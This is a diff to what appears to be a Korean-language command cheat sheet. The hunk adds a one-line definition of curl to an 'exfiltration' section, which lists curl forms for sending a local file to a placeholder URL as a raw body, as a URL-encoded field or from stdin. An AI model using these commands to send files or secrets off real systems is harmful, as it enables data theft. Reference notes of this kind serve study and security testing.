@@ -95,6 +95,7 @@ pwd / id          현재 경로 / 실행 권한
 
 exfiltration:
 ```
+curl: URL로 요청을 보내고 그 응답을 받아 출력하는 명령
 curl -d @FILE URL                    파일을 본문에 실어 전송 (날것)
 curl --data-urlencode NAME@FILE URL  파일을 URL 인코딩해 NAME 필드로 전송 (안전)
 curl ... @- URL                      @- 는 stdin을 읽음 (파이프와 조합)
